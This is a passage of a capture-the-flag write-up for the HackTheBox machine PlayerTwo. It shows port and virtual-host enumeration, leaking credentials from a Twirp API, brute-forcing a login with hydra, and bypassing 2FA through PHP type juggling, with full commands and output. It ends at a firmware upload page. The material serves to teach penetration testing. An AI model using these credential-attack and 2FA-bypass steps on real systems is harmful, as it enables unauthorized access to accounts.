---
title: HTB: PlayerTwo
url: https://0xdf.gitlab.io/2020/06/27/htb-playertwo.html
date: 2020-06-27T14:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: ctf, htb-playertwo, hackthebox, nmap, vhosts, gobuster, wfuzz, twirp, proto3, api, totp, signing, binwalk, hexedit, pspy, php, linux, chisel, mqtt, paho, python, ssh, exploit, htb-rope, heap, tcache, ldd, patchelf, ghidra, checksec, gdb, pwntools, type-juggling, pwngdb, htb-ellingson, htb-player
---

![PlayerTwo](https://0xdfimages.gitlab.io/img/playertwo-cover.png)

PlayerTwo was just a monster of a box. Enumeration across three virtual hosts reveals a Twirp API where I can leak some credentials. Another API can be enumerated to find backup codes for for the 2FA for the login. With creds and backup codes, I can log into the site, which has a firmware upload section. The example firmware is signed, but only the first roughly eight thousand bytes. I’ll find a way to modify the arguments to a call to system to get execution and a shell. With a shell, I see a MQTT message queue on localhost, and connecting to it, I’ll find a private SSH key being sent, which I can use to get a shell as the next user. Finally, to get to root, I’ll do a heap exploit against a root SUID binary to get a shell. In a Beyond Root section that could be its own blog post, I’ll dig into a few unintended ways to skips parts of the intended path, and dig deeper on others.

## Box Info

| Name | [PlayerTwo](https://hackthebox.com/machines/playertwo)  [PlayerTwo](https://hackthebox.com/machines/playertwo) [Play on HackTheBox](https://hackthebox.com/machines/playertwo) |
| --- | --- |
| Release Date | [14 Dec 2019](https://twitter.com/hackthebox_eu/status/1205431228842872832) |
| Retire Date | 27 Jun 2020 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for PlayerTwo |
| Radar Graph | Radar chart for PlayerTwo |
| First Blood User | 04:01:09[jkr jkr](https://app.hackthebox.com/users/77141) |
| First Blood Root | 03:58:27[xct xct](https://app.hackthebox.com/users/13569) |
| Creators | [MrR3boot MrR3boot](https://app.hackthebox.com/users/13531)  [b14ckh34rt b14ckh34rt](https://app.hackthebox.com/users/64903) |

## Recon

### nmap

`nmap` shows three open ports, SSH (TCP 22), HTTP (TCP 80 and 8454):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/alltcp 10.10.10.170
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-20 06:45 EST
Nmap scan report for 10.10.10.170                          
Host is up (0.019s latency).                               
Not shown: 65532 closed ports                              
PORT     STATE SERVICE                                     
22/tcp   open  ssh                                         
80/tcp   open  http
8545/tcp open  unknown    

Nmap done: 1 IP address (1 host up) scanned in 7.73 seconds                                                            
root@kali# nmap -p 22,80,8545 -sC -sV -oA scans/tcpscripts 10.10.10.170
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-20 06:46 EST
Nmap scan report for 10.10.10.170
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION                             
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0e:7b:11:2c:5e:61:04:6b:e8:1c:bb:47:b8:4d:fe:5a (RSA)
|   256 18:a0:87:56:64:06:17:56:4d:6a:8c:79:4b:61:56:90 (ECDSA)
|_  256 b6:4b:fc:e9:62:08:5a:60:e0:43:69:af:29:b3:27:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))      
|_http-server-header: Apache/2.4.29 (Ubuntu)               
|_http-title: Site doesn't have a title (text/html).       
8545/tcp open  http    (PHP 7.2.24-0ubuntu0.18.04.1)
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Date: Mon, 20 Jan 2020 11:47:06 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/nice%20ports%2C/Tri%6Eity.txt%2ebak"","meta":{"twirp_invalid_route":"GET /nice%20ports%2C/Tri%6Eity.txt%2ebak"}}
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Date: Mon, 20 Jan 2020 11:46:58 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Date: Mon, 20 Jan 2020 11:46:58 GMT
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
|     Content-Type: application/json
|     {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"OPTIONS /"}}
|   OfficeScan:
|     HTTP/1.1 404 Not Found
|     Date: Mon, 20 Jan 2020 11:47:06 GMT                  
|     Connection: close
|     X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1            
|     Content-Type: application/json
|_    {"code":"bad_route","msg":"no handler for path "/"","meta":{"twirp_invalid_route":"GET /"}}
|_http-title: Site doesn't have a title (application/json).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8545-TCP:V=7.80%I=7%D=1/20%Time=5E259313%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,FC,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,\x2020\x2
SF:0Jan\x202020\x2011:46:58\x20GMT\r\nConnection:\x20close\r\nX-Powered-By
SF::\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20application/j
SF:son\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20for\x20pa
SF:th\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/\"}}"
SF:)%r(HTTPOptions,100,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x20Mon,\
SF:x2020\x20Jan\x202020\x2011:46:58\x20GMT\r\nConnection:\x20close\r\nX-Po
SF:wered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nContent-Type:\x20appli
SF:cation/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"no\x20handler\x20f
SF:or\x20path\x20\\\"\\/\\\"\",\"meta\":{\"twirp_invalid_route\":\"OPTIONS
SF:\x20\\/\"}}")%r(FourOhFourRequest,144,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nDate:\x20Mon,\x2020\x20Jan\x202020\x2011:47:06\x20GMT\r\nConnection
SF::\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04\.1\r\nCont
SF:ent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\",\"msg\":\"
SF:no\x20handler\x20for\x20path\x20\\\"\\/nice%20ports%2C\\/Tri%6Eity\.txt
SF:%2ebak\\\"\",\"meta\":{\"twirp_invalid_route\":\"GET\x20\\/nice%20ports
SF:%2C\\/Tri%6Eity\.txt%2ebak\"}}")%r(OfficeScan,FC,"HTTP/1\.1\x20404\x20N
SF:ot\x20Found\r\nDate:\x20Mon,\x2020\x20Jan\x202020\x2011:47:06\x20GMT\r\
SF:nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.24-0ubuntu0\.18\.04
SF:\.1\r\nContent-Type:\x20application/json\r\n\r\n{\"code\":\"bad_route\"
SF:,\"msg\":\"no\x20handler\x20for\x20path\x20\\\"\\/\\\"\",\"meta\":{\"tw
SF:irp_invalid_route\":\"GET\x20\\/\"}}");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.24 seconds

```

Based on the [Apache](https://packages.ubuntu.com/search?keywords=apache2) and [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) versions, this looks like Ubuntu Bionic (18.04). The server on the non-standard HTTP port is interesting in that it looks to be using just PHP.

### Website - TCP 80

#### Site

The page returns what looks like an error:

![image-20200122212950773](https://0xdfimages.gitlab.io/img/image-20200122212950773.png)

However, looking in Burp I can see it’s actually an HTTP 200 response, with the source being just whitespace and this image:

```

HTTP/1.1 200 OK
Date: Mon, 20 Jan 2020 12:01:07 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Sun, 01 Dec 2019 02:52:34 GMT
ETag: "66-5989b8e1628f3-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Length: 102
Connection: close
Content-Type: text/html

<html>
<center><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><img src="1.png"/>
</html>

```

There’s a virtual host to look at, player2.htb, based on the email address.

#### Directory Brute Force

`gobuster` doesn’t find anything either:

```

root@kali# gobuster dir -u http://10.10.10.170 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-80-root-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.170
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/01/20 07:10:28 Starting gobuster
===============================================================
/server-status (Status: 403)
===============================================================
2020/01/20 07:14:40 Finished
===============================================================

```

### Subdomain Brute Force

Given the reference to player2.htb, before pivoting to this virtual host, I’ll look for additional subdomains with `wfuzz`. It finds one:

```

root@kali# wfuzz -c -u 'http://10.10.10.170' -H 'Host: FUZZ.player2.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hl 3 --hc 400
********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://10.10.10.170/
Total requests: 114532

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                  
===================================================================

000002882:   200        235 L    532 W    5063 Ch     "product"                                                                                                                                                

Total time: 193.3370
Processed Requests: 114532
Filtered Requests: 114531
Requests/sec.: 592.3953

```

### player2.htb - TCP 80

#### Site

With my hosts file updated, visiting http://player2.htb does return a page:

[![website](https://0xdfimages.gitlab.io/img/image-20200122213032208.png)](https://0xdfimages.gitlab.io/img/image-20200122213032208.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200122213032208.png)

The site is all about the flaws in the [first Player box](/2020/01/18/htb-player.html), and how they were exploited.

There’s a contact form at the bottom of the page, which I played with a bit, doing some basic SQL, but nothing obvious jumped out.

#### Directory Brute Force

`gobuster` only turned up one path that I didn’t see in a quick scan through the page source:

```

root@kali# gobuster dir -u http://player2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-80-player2-root-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player2.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/01/20 07:15:13 Starting gobuster
===============================================================
/mail (Status: 200)
/mail.php (Status: 200)
/assets (Status: 301)
/src (Status: 301)
/index (Status: 200)
/index.php (Status: 200)
/images (Status: 301)
/vendor (Status: 301)
/proto (Status: 301)
/generated (Status: 301)
/server-status (Status: 403)
===============================================================
2020/01/20 07:19:30 Finished
===============================================================

```

All of the directories that show 301 redirect to the same path with `/` on the end, and then return 302 Forbidden. All of the directories seem like resources for the main page, except for `/proto`. I poked at it a bit, and ran a `gobuster` against it, but nothing interesting came back at this point. I’ll be back to this in a minute.

### product.player2.htb - TCP 80

#### Site

The page presents a login form:

![image-20200122213135627](https://0xdfimages.gitlab.io/img/image-20200122213135627.png)

When I put in incorrect info, it just returns a pop-up and redirects back to the form:

![image-20200122213202865](https://0xdfimages.gitlab.io/img/image-20200122213202865.png)

#### Directory Brute Force

`gobuster` shows some interesting paths, but everything just redirects back to `index`, returns 302 Forbidden, or returns a blank page (`conn.php`):

```

root@kali# gobuster dir -u http://product.player2.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 40 -o scans/gobuster-80-product-root-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/01/20 07:40:34 Starting gobuster
===============================================================
/images (Status: 301)
/mail (Status: 200)
/mail.php (Status: 200)
/assets (Status: 301)
/home (Status: 302)
/home.php (Status: 302)
/api (Status: 301)
/index (Status: 200)
/index.php (Status: 200)
/conn (Status: 200)
/conn.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/01/20 07:44:54 Finished
===============================================================

```

`/api` is certainly interesting, but I did some poking around and ran `gobuster` on it and didn’t find anything.

### Twirp API - TCP 8545

#### Initial API

Based on the `nmap` output I could see the service on 8545 was using HTTP, returning JSON. Seems like it is some kind of API. I’ll request the root with `curl` (using `jq` for pretty print):

```

root@kali# curl -s http://10.10.10.170:8545/ | jq .
{
  "code": "bad_route",
  "msg": "no handler for path \"/\"",
  "meta": {
    "twirp_invalid_route": "GET /"
  }
}

```

[Twirp](https://github.com/twitchtv/twirp) is an API framework from Twitchtv, written in Go. The idea is that you can define your service in a Protobuf file, as defined [here](https://developers.google.com/protocol-buffers/docs/proto3), and then it stands up the API based on that. The [example .proto file](https://github.com/twitchtv/twirp/blob/master/example/service.proto) is:

```

syntax = "proto3";

package twitch.twirp.example;
option go_package = "example";

// A Hat is a piece of headwear made by a Haberdasher.
message Hat {
  // The size of a hat should always be in inches.
  int32 size = 1;

  // The color of a hat will never be 'invisible', but other than
  // that, anything is fair game.
  string color = 2;

  // The name of a hat is it's type. Like, 'bowler', or something.
  string name = 3;
}

// Size is passed when requesting a new hat to be made. It's always
// measured in inches.
message Size {
  int32 inches = 1;
}

// A Haberdasher makes hats for clients.
service Haberdasher {
  // MakeHat produces a hat of mysterious, randomly-selected color!
  rpc MakeHat(Size) returns (Hat);
}

```

#### Find .proto File

Understanding how Twirp works, I don’t see much value in fuzzing the API, but rather, I need to find the `.proto` file. I remember `http://player2.htb/proto` from `gobuster` above. That’s interesting. I’ll brute force for `.proto` files, and find one:

```

root@kali# gobuster dir -u http://player2.htb/proto -x proto -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster-80-player2-proto-proto
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://player2.htb/proto
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     proto
[+] Timeout:        10s
===============================================================
2020/01/20 09:13:03 Starting gobuster
===============================================================
/generated.proto (Status: 200)
===============================================================
2020/01/20 09:22:40 Finished
===============================================================

```

I can access it in a browser:

```

syntax = "proto3";

package twirp.player2.auth;
option go_package = "auth";

service Auth {
  rpc GenCreds(Number) returns (Creds);
}

message Number {
  int32 count = 1; // must be > 0
}

message Creds {
  int32 count = 1;
  string name = 2; 
  string pass = 3; 
}

```

This should give me the information I need to interact with the API.

## Shell as www-data

### Access Protobs Site

#### Get Creds from Twirp API

Looking at [the docs](https://twitchtv.github.io/twirp/docs/curl.html#json), like I should issue a request using `curl` that looks like:

```

curl --request "POST" \
     --location "http://localhost:8080/twirp/[package].[service]/[rpc]" \
     --header "Content-Type:application/json" \
     --data '{"[key for input message]": [value]}'

```

It’s not clear to me if I need the `/twirp/` or not. I have the following:
- package: `twirp.player2.auth`
- service: `Auth`
- rpc: `GenCreds`
- key input: `count` or `Number`
- value: `1` (as a guess?)

My initial attempt is:

```

root@kali# curl -s --request POST --location "http://10.10.10.170:8545/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"count": 1}' | jq .
{
  "code": "bad_route",
  "msg": "no handler for path \"/twirp.player2.auth.Auth/GenCreds\"",
  "meta": {
    "twirp_invalid_route": "POST /twirp.player2.auth.Auth/GenCreds"
  }
}

```

It is still an invalid route. Then I tried adding the `/twirp`/:

```

root@kali# curl -s --request POST --location "http://10.10.10.170:8545/twirp/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"count": 1}' | jq .
{
  "code": "internal",
  "msg": "internal error",
  "meta": {
    "cause": "Call to undefined function Google\\Protobuf\\Internal\\bccomp()"
  }
}

```

That’s a different error. Seems I found the API endpoint. I tried `number` in place of `count` and it worked:

```

root@kali# curl -s --request POST --location "http://10.10.10.170:8545/twirp/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"number": 1}' | jq .
{
  "name": "snowscan",
  "pass": "Lp-+Q8umLW5*7qkc"
}

```

There’s a reference to snowscan, who is a fixture in the top five in the [HTB Hall of Fame](https://www.hackthebox.eu/home/hof). More importantly, it looks like creds.

I noticed that if I ran the same request again, I got a different username and password:

```

root@kali# curl -s --request POST --location "http://10.10.10.170:8545/twirp/twirp.player2.auth.Auth/GenCreds" --header "Content-Type:application/json" --data '{"number": 1}' | jq .
{
  "name": "jkr",
  "pass": "ze+EKe-SGF^5uZQX"
}

```

jkr is another brilliant HTB player, and a new password. I ran it 500 times to see how many different combinations came back. Each time in this loop, it will use `curl` to get the JSON creds structure, and then add a newline. The results will then be passed to `sort -u`, which will get only the unique values. Then I’ll use `tee` to save the unique creds to `creds.json`, and then `wc -l` to see how many there are.

```

root@kali# for i in {1..500}; do 
>   curl -s -X POST -H "Content-Type:application/json" -d '{"number": 2}' http://player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds;
>   echo; 
> done | sort -u | tee creds.json | wc -l
16

```

The number posted doesn’t seem to matter. This always returns 16 different sets of credentials.

Looking at the creds, its each combination of four users (I’m honored to be one of them) and four passwords:

```

root@kali# cat creds.json 
{"name":"0xdf","pass":"Lp-+Q8umLW5*7qkc"}
{"name":"0xdf","pass":"tR@dQnwnZEk95*6#"}
{"name":"0xdf","pass":"XHq7_WJTA?QD_?E2"}
{"name":"0xdf","pass":"ze+EKe-SGF^5uZQX"}
{"name":"jkr","pass":"Lp-+Q8umLW5*7qkc"}
{"name":"jkr","pass":"tR@dQnwnZEk95*6#"}
{"name":"jkr","pass":"XHq7_WJTA?QD_?E2"}
{"name":"jkr","pass":"ze+EKe-SGF^5uZQX"}
{"name":"mprox","pass":"Lp-+Q8umLW5*7qkc"}
{"name":"mprox","pass":"tR@dQnwnZEk95*6#"}
{"name":"mprox","pass":"XHq7_WJTA?QD_?E2"}
{"name":"mprox","pass":"ze+EKe-SGF^5uZQX"}
{"name":"snowscan","pass":"Lp-+Q8umLW5*7qkc"}
{"name":"snowscan","pass":"tR@dQnwnZEk95*6#"}
{"name":"snowscan","pass":"XHq7_WJTA?QD_?E2"}
{"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}

```

#### Identify Valid Creds

With creds, I first tried SSH, but none worked. Then I tried the login form at `http://product.player2.htb`. The first one I tried didn’t work, so I decided to automate. I created username and password lists:

```

root@kali# cat creds.json | jq -r .name | sort -u > users
root@kali# cat creds.json | jq -r .pass | sort -u > passwords

```

Now I’ll run `hydra` to try all combinations of username and password. The command breaks down as:
- `-L users` - list of usernames to try
- `-P passwords` - list of passwords to try
- `product.player2.htb` - site to try
- `http-post-form` - type of brute force
- `"/:username=^USER^&password=^PASS^&Submit=Sign+in:alert"`
  - `/` - path to POST to
  - `username=^USER^&password=^PASS^&Submit=Sign+in` - POST parameters, where `^USER^` and `^PASS^` will be replaced by usernames and passwords from the respective input lists
  - `alert` - text to look for in the response that indicates failure

```

root@kali# hydra -L users -P passwords product.player2.htb http-post-form "/:username=^USER^&password=^PASS^&Submit=Sign+in:alert"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-20 14:31:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://product.player2.htb:80/:username=^USER^&password=^PASS^&Submit=Sign+in:alert
[80][http-post-form] host: product.player2.htb   login: 0xdf   password: XHq7_WJTA?QD_?E2
[80][http-post-form] host: product.player2.htb   login: mprox   password: tR@dQnwnZEk95*6#
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-20 14:31:50

```

So two of the username / password combinations work. When I try one manually, it does work, and I’m taken to the second stage of login.

#### Get OTP Backup Codes

One giving good creds at the username / password form, I’m given another check:

![image-20200120143539175](https://0xdfimages.gitlab.io/img/image-20200120143539175.png)

When I submit `123456`, I get the same `alert` box:

![image-20200120143808771](https://0xdfimages.gitlab.io/img/image-20200120143808771.png)

The HTTP response looks like:

```

HTTP/1.1 200 OK
Date: Mon, 20 Jan 2020 19:38:18 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 104
Connection: close
Content-Type: text/html; charset=UTF-8

<script language='javascript'>alert('Nope.');window.location='http://product.player2.htb/totp';</script>

```

Basically a script that pops the alert, then redirects back to `/totp`, which returns a 302 back to `/`.

At this point I was pretty stuck, but eventually I turned back to `product.player2.htb/api`. Eventually while running additional word lists I came across `/api/totp`:

```

root@kali# gobuster dir -u http://product.player2.htb/api -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -t 40 -o 
scans/gobuster-80-product-api-1.0
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://product.player2.htb/api
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/24 14:21:53 Starting gobuster
===============================================================
/totp (Status: 200)
===============================================================
2020/01/24 14:23:15 Finished
===============================================================

```

It still returns an error:

```

root@kali# curl -s http://product.player2.htb/api/totp
{"error":"Cannot GET \/"}

```

Changing the request to a POST changed the error:

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp
{"error":"Invalid Session"}

```

I grabbed my cookie from Firefox where I had just logged in and added that:

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp -H "Cookie: PHPSESSID=o91scokidvotca1i0tolpdmjp9"
{"error":"Invalid action"}

```

Note, if I try to send a OTP in Firefox, the cookie no longer works to get access to the API. The server must think this session is in the state after successful creds but then set it back to invalid on any failed OTP.

I tried adding `/action/` to the url, but that caused a 500 error. So I tried sending `action` as a parameter name. With any other parameter, it returns `Invalid Action`:

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp -H "Cookie: PHPSESSID=49fej68t3k9vlr2ga16prnbsac" -d '{"aaaa":"code"}'
{"error":"Invalid action"}

```

But with `action`, it returns `Missing parameters`:

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp -H "Cookie: PHPSESSID=49fej68t3k9vlr2ga16prnbsac" -d '{"action":"code"}'
{"error":"Missing parameters"}

```

It’s not totally clear to me how the box author expected us to make this next leap. I got lucky in guessing around, I tried `0` (as an integer, not a string) and got a match:

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp -H "Cookie: PHPSESSID=o91scokidvotca1i0tolpdmjp9" -H 'Content-Type:application/json' -d '{"action":0}'
{"user":"0xdf","code":"91231238385454"}

```

This is a PHP type juggling vulnerability, and I’ll look at it in [Beyond Root](#php-type-juggling).

It also works if you happen to guess the `action`, `backup_codes` (but given that `backup_codes` isn’t in an common wordlists I know of, that’d be a pretty un-fun guess to ask us to make):

```

root@kali# curl -s -X POST http://product.player2.htb/api/totp -H "Cookie: PHPSESSID=49fej68t3k9vlr2ga16prnbsac" -d '{"action":"backup_codes"}'
{"user":"0xdf","code":"91231238385454"}

```

Either way, I have a backup code to bypass 2FA (it seems static).

Entering that into the form logs in to the Protobs site.

### Protobs Enumeration

#### Site

The site is a gaming site:

[![](https://0xdfimages.gitlab.io/img/image-20200623145802192.png)](https://0xdfimages.gitlab.io/img/image-20200623145802192.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200623145802192.png)

The intro text reads:

> Protobs - Players Choice..
>
> A device designed to provide a real visual experience for most of the games on market.
> We are improvising more features which has never been provided by other devices till date.

There’s some other marketing text, but the paragraph that jumped out is:

> Get an early access to Protobs
>
> Please read our documentation here to understand and work with our new protocol Protobs.
>
> We also coming up with a Responsible Vulnerable Disclosure Program in the future to understand more issues in our development cycle. Stay tuned for the updates.

The documentation link leads to a pdf: http://product.player2.htb/protobs.pdf

#### protobs.pdf

The PDF describes the process for how new firmware is uploaded and validated by the system. First, it shows how the binary is signed:

![image-20200122065751511](https://0xdfimages.gitlab.io/img/image-20200122065751511.png)

This diagram doesn’t make a ton of sense. Really, the code would go into the Hash Function (not come out of it), and then Y would go into Sig, and then X and Z would make the binary. But I think I get the point - firmware is signed and the signature is attached to the top of the file.

And then how new firmware is validated, and loaded only if the signature is valid:

![image-20200122065821275](https://0xdfimages.gitlab.io/img/image-20200122065821275.png)

The last page has a list of security considerations, and the last paragraph gives useful links:

> Our trusted developers and customers can upgrade device firmware from our cloud portal. You can download protobs firmware from (http://product.player2.htb/protobs/protobs\_firmware\_v1.0.tar). We recommend our dev team to do a sanity check at http://product.player2.htb/protobs/ before provisioning or pushing updates of the firmware.

I’ll play around with `gobuster` on `product.player2.htb/protobs` in [Beyond Root](#find-keys-and-algorithm) to show an unintended path, though it’s necessary not for the intended path.

#### Firmware

The firmware download is a `.tar` archive containing three files:

```

root@kali# tar tf protobs_firmware_v1.0.tar
info.txt
Protobs.bin
version

```

On extracting, I can see `info.txt` and `version` are short ASCII files:

```

root@kali# cat info.txt 
© Playe2 2019. All rights reserved.

This firmware package consists of files which are distributed under different license terms, in particular under Player2 proprietary license or under any Open Source License (namely GNU General Public License, GNU Less
er General Public License or FreeBSD License). The source code of those files distributed as Open Source are available on written request to mrr3boot@player2.htb.

Under all Player2 intellectual property rights, Player2 grants the non-exclusive right to personally use this Protobs firmware package which is delivered in object code format only. Licensee shall only be entitled to 
make a copy exclusively reserved for personal backup purposes (backup copy). Player2 reserves all intellectual property rights except as expressly granted herein. Without the prior written approval of Player2 and except
 to the extent as may be expressly authorised under mandatory law, this Protobs firmware package in particular
- shall not be copied, distributed or otherwise made publicly available
- shall not be modified, disassembled, reverse engineered, decompiled or otherwise "be opened" in whole or in part, and insofar shall not be copied, distributed or otherwise made publicly available.

root@kali# cat version 
FIRMWAREVERSION=122.01.14,,703021,

```

`file` shows `Protobs.bin` as just data (ie, it doesn’t recognize a file type):

```

root@kali# file Protobs.bin 
Protobs.bin: data

```

However, `binwalk` shows an ELF binary at offset 64 bytes:

```

root@kali# binwalk Protobs.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
64            0x40            ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV)

```

I can see this with `xxd`:

```

root@kali# xxd Protobs.bin | head
00000000: 5641 7eb5 877e 1ef4 b1ea a18b c792 d494  VA~..~..........   <--- signature
00000010: 1c9c b8b3 1145 e0b7 30da 24d3 4799 19f3  .....E..0.$.G...
00000020: fbf2 5574 d1b1 3c53 b262 68f3 eb2a 49c5  ..Ut..<S.bh..*I.
00000030: 1b24 fe33 f51a fa3e b6b4 b905 610b cb03  .$.3...>....a...
00000040: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............   <-- ELF
00000050: 0200 3e00 0100 0000 f010 4000 0000 0000  ..>.......@.....
00000060: 4000 0000 0000 0000 303c 0000 0000 0000  @.......0<......
00000070: 0000 0000 4000 3800 0b00 4000 1c00 1b00  ....@.8...@.....
00000080: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000090: 4000 4000 0000 0000 4000 4000 0000 0000  @.@.....@.@.....

```

Just looking at the strings in the binary, a couple jumped out as interesting:

```

/lib64/ld-linux-x86-64.so.2
libc.so.6
exit
puts
__stack_chk_fail
putchar
stdin
printf
strtol
fgets
getchar
stdout
stderr
system
strchr
sleep
setbuf
__libc_start_main
GLIBC_2.4
GLIBC_2.2.5
__gmon_start__
[]A\A]A^A_
[!] Protobs: Signing failed...
[!] Protobs: Service shutting down...
[!] Protobs: Unexpected unrecoverable error!
[!] Protobs: Service exiting now...
stty raw -echo min 0 time 10
stty sane
[*] Protobs: User input detected. Launching Dev Console Utility
  ___         _       _       
 | _ \_ _ ___| |_ ___| |__ ___
 |  _/ '_/ _ \  _/ _ \ '_ (_-<
 |_| |_| \___/\__\___/_.__/__/
                              v1.0 Beta
[*] Protobs: Firmware booting up.
[*] Protobs: Fetching configs...
;*3$"
GCC: (Debian 9.2.1-19) 9.2.1 20191109
...[snip]...

```

First, `system` is in the list of functions called from LIBC. That’s interesting, and useful if I can control what is passed to it. Second, There’s two strings that start with `stty`, a command I know well from [upgrading shells](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). It seems likely that those strings are passed to `system`.

#### Sandbox

The url from the PDF, `http://product.player2.htb/protobs/`, leads to a page where firmware can be uploaded:

![image-20200122070522190](https://0xdfimages.gitlab.io/img/image-20200122070522190.png)

